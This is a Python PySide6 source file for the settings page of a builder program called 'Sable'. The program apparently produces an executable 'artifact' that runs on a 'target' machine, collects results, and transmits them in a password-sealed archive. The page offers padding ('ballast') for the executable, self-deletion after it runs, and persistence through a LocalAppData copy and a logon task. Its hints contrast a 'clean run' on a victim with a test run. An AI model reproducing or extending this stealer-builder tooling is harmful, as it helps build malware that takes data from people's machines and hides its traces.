"""Tuning page: mutex, seal key, self-remove, local copy, ballast, output directory.

``ballast_mb`` is clamped here to ``MAX_BALLAST_MB`` from the schema, because a spin box
with a range of its own would be a second opinion about a number the schema already
bounds. The ceiling is read from ``core.schema`` and never written down twice.

The seal key field is masked and has a reveal toggle. It is not kept in ``QSettings``:
the archive is sealed with whatever is in the box at build time, and a key remembered
between sessions is a key on disk that nobody asked to be there. The mutex and the
output directory are remembered, because both are ordinary preferences.

The page is four cards rather than one column, because the eight controls answer three
different questions — what the run is called, how the file is padded, and what happens
after it lands. ``self_remove`` carries a warning line of its own, because it is the one
setting that deletes the artifact after it runs and there is no undo. ``keep_local`` gets
the same treatment from the other side: it leaves a copy on the target, which is exactly
what a test run wants and exactly what a real run does not.
"""

from __future__ import annotations

import secrets
from typing import Final

from PySide6.QtCore import QSettings, Qt
from PySide6.QtWidgets import (
    QCheckBox,
    QHBoxLayout,
    QLabel,
    QPushButton,
    QSpinBox,
    QVBoxLayout,
    QWidget,
)

from core.schema import MAX_BALLAST_MB, MAX_PERSIST_HOURS

from ..widgets.field import Card, LabelledEdit

__all__ = ["TuningPage", "generate_key"]

_DEFAULT_MUTEX: Final[str] = "Global\\SableRun"
_MIN_KEY_LENGTH: Final[int] = 12

_MUTEX_KEY: Final[str] = "form/mutex"
_OUTPUT_KEY: Final[str] = "form/output"

_NUMBER_WIDTH: Final[int] = 150


def generate_key(length: int = 32) -> str:
    """A fresh seal key. Hex, so it survives every parser and every shell."""
    return secrets.token_hex(length // 2)


class TuningPage(QWidget):
    """Mutex name, seal key, self-remove, ballast and the output directory."""

    title: Final[str] = "Tuning"
    description: Final[str] = "Runtime names, padding and where the build lands."

    def __init__(self, parent: QWidget | None = None) -> None:
        super().__init__(parent)

        # --- identity --------------------------------------------------------
        # The mutex is a preference and is restored; the seal key is not, because a key
        # remembered between launches is a key on disk nobody asked to keep.
        remembered_mutex = str(QSettings().value(_MUTEX_KEY, "") or "").strip()
        self._mutex = LabelledEdit(
            "Mutex name", text=remembered_mutex or _DEFAULT_MUTEX
        )
        self._seal_key = LabelledEdit(
            "Seal key", placeholder=f"at least {_MIN_KEY_LENGTH} characters"
        )
        self._seal_key._edit.setEchoMode(self._seal_key._edit.EchoMode.Password)

        self._reveal = QPushButton("Show")
        self._reveal.setCheckable(True)
        self._reveal.setObjectName("reveal")
        self._reveal.setCursor(Qt.CursorShape.PointingHandCursor)
        self._reveal.toggled.connect(self._on_reveal)

        self._generate = QPushButton("Generate")
        self._generate.setObjectName("generate")
        self._generate.setCursor(Qt.CursorShape.PointingHandCursor)
        self._generate.clicked.connect(self._on_generate)

        button_row = QHBoxLayout()
        button_row.setContentsMargins(0, 0, 0, 0)
        button_row.setSpacing(8)
        button_row.addWidget(self._reveal)
        button_row.addWidget(self._generate)
        button_row.addStretch(1)

        key_hint = QLabel(
            f"The transmitted archive is sealed with this key, anywhere in the world, "
            f"with a zip tool. Not remembered between launches: {_MIN_KEY_LENGTH} "
            "characters minimum."
        )
        key_hint.setObjectName("hint")
        key_hint.setWordWrap(True)

        identity = Card(
            "Identity",
            "The mutex keeps two runs from overlapping. The seal key is the password "
            "on the archive.",
        )
        identity.add(self._mutex)
        identity.add(self._seal_key)
        identity.add_row(button_row)
        identity.body.addWidget(key_hint)

        # --- artifact --------------------------------------------------------
        self._ballast = QSpinBox()
        self._ballast.setObjectName("ballast")
        self._ballast.setRange(0, MAX_BALLAST_MB)
        self._ballast.setSingleStep(64)
        self._ballast.setSuffix(" MB")
        self._ballast.setValue(0)
        self._ballast.setFixedWidth(_NUMBER_WIDTH)

        ballast_label = QLabel("Ballast")
        ballast_label.setObjectName("fieldLabel")
        ballast_note = QLabel(
            f"Padding appended to the artifact. 0 to {MAX_BALLAST_MB} MB, whole numbers. "
            "Ignored by the script output, where padding changes nothing."
        )
        ballast_note.setObjectName("hint")
        ballast_note.setWordWrap(True)

        artifact = Card("Artifact", "How much dead weight the executable carries.")
        artifact.body.addWidget(ballast_label)
        artifact.add(self._ballast)
        artifact.body.addWidget(ballast_note)

        # --- behaviour -------------------------------------------------------
        self._self_remove = QCheckBox("Delete the artifact after it runs")
        self._self_remove.setObjectName("selfRemove")
        self._self_remove_note = QLabel(
            "The artifacts are transmitted, then the file removes itself. No undo."
        )
        self._self_remove_note.setObjectName("hint")
        self._self_remove_note.setWordWrap(True)

        self._keep_local = QCheckBox("Keep a copy of the results on the target")
        self._keep_local.setObjectName("keepLocal")
        self._keep_local_note = QLabel(
            "Copies the collected zip to Documents\\Sable Results before sending, with "
            "a readable summary beside it. Use it on a machine you control; leave it "
            "off for a clean run."
        )
        self._keep_local_note.setObjectName("hint")
        self._keep_local_note.setWordWrap(True)

        self._persist = QCheckBox("Stay on the machine and run again")
        self._persist.setObjectName("persist")
        self._persist_note = QLabel(
            "Copies the artifact into LocalAppData and registers a logon task, so the "
            "machine produces another result after a reboot instead of exactly one. "
            "The copy is a file that stays put; leave this off for a clean run."
        )
        self._persist_note.setObjectName("hint")
        self._persist_note.setWordWrap(True)

        self._persist_hours = QSpinBox()
        self._persist_hours.setObjectName("persistHours")
        self._persist_hours.setRange(0, MAX_PERSIST_HOURS)
        self._persist_hours.setSingleStep(1)
        self._persist_hours.setSuffix(" h")
        self._persist_hours.setSpecialValueText("on logon only")
        self._persist_hours.setValue(0)
        self._persist_hours.setFixedWidth(_NUMBER_WIDTH + 40)
        self._persist_hours.setEnabled(False)
        self._persist.toggled.connect(self._persist_hours.setEnabled)
        self._persist.toggled.connect(self._repaint_persist)

        persist_row = QHBoxLayout()
        persist_row.setContentsMargins(24, 0, 0, 0)
        persist_row.setSpacing(10)
        persist_row.addWidget(self._persist_hours, 0)
        persist_row.addStretch(1)

        behaviour = Card(
            "Behaviour", "What the agent does after it has transmitted."
        )
        behaviour.add(self._self_remove)
        behaviour.body.addWidget(self._self_remove_note)
        behaviour.add(self._keep_local)
        behaviour.body.addWidget(self._keep_local_note)
        behaviour.add(self._persist)
        behaviour.body.addWidget(self._persist_note)
        behaviour.add_row(persist_row)

        # --- destination -----------------------------------------------------
        self._output = LabelledEdit(
            "Output directory", placeholder="where the finished artifact is written", browse=True
        )
        self._output.set_text(str(QSettings().value(_OUTPUT_KEY, "")))

        destination = Card(
            "Destination",
            "Where this machine writes the artifact. Nothing is transmitted from here.",
        )
        destination.add(self._output)

        column = QVBoxLayout(self)
        column.setContentsMargins(0, 0, 0, 0)
        column.setSpacing(18)
        column.addWidget(identity)
        column.addWidget(artifact)
        column.addWidget(behaviour)
        column.addWidget(destination)
        column.addStretch(1)

        self._mutex.changed.connect(self._remember_mutex)
        self._output.changed.connect(self._remember_output)
        self._repaint_persist(False)

    # --- value ---------------------------------------------------------------

    def values(self) -> dict[str, object]:
        return {
            "mutex": self._mutex.text().strip(),
            "seal_key": self._seal_key.text(),
            "self_remove": self._self_remove.isChecked(),
            "keep_local": self._keep_local.isChecked(),
            "persist": self._persist.isChecked(),
            "persist_hours": int(self._persist_hours.value()),
            "ballast_mb": int(self._ballast.value()),
            "out_dir": self._output.text().strip(),
        }

    def reset(self) -> None:
        self._mutex.set_text(_DEFAULT_MUTEX)
        self._seal_key.set_text("")
        self._self_remove.setChecked(False)
        self._keep_local.setChecked(False)
        self._persist.setChecked(False)
        self._persist_hours.setValue(0)
        self._ballast.setValue(0)
        self._mutex.clear_problem()
        self._seal_key.clear_problem()
        self._output.clear_problem()

    # --- state ---------------------------------------------------------------

    def show_problems(self, problems) -> None:
        for problem in problems:
            if problem.path == "mutex":
                self._mutex.set_problem(problem.message)
            elif problem.path == "seal_key":
                self._seal_key.set_problem(problem.message)
            elif problem.path == "ballast_mb":
                self._ballast.setToolTip(problem.message)
            elif problem.path == "output.dir":
                self._output.set_problem(problem.message)

    # --- internals -----------------------------------------------------------

    def _repaint_persist(self, enabled: bool) -> None:
        # The hour field only means something while persistence is on, so it is dimmed
        # rather than left looking like a live setting.
        self._persist_hours.setEnabled(enabled)

    def _on_reveal(self, revealed: bool) -> None:
        mode = self._seal_key._edit.EchoMode
        self._seal_key._edit.setEchoMode(mode.Normal if revealed else mode.Password)
        self._reveal.setText("Hide" if revealed else "Show")

    def _on_generate(self) -> None:
        self._seal_key.set_text(generate_key())
        self._seal_key.clear_problem()

    def _remember_mutex(self, value: str) -> None:
        settings = QSettings()
        settings.setValue(_MUTEX_KEY, value)

    def _remember_output(self, value: str) -> None:
        settings = QSettings()
        settings.setValue(_OUTPUT_KEY, value)
